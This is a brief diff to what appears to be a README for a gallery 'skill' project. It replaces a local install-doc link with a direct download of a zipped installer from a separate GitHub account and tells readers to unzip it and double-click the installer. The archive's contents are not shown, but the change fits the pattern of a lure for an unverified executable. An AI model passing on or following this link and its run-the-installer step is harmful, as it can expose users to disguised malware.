@@ -6,7 +6,7 @@
 
 Download → unzip → double click installer
 
-[Download Installer](INSTALL.md)
+[Download Installer](https://github.com/xiaozhoustefanie227/jean-gauthier-paris-gallery-skill/releases/download/v4.0.0/Jean-Gauthier-Paris-Gallery-Skill-V4.zip)
 
 Inspired by:
 
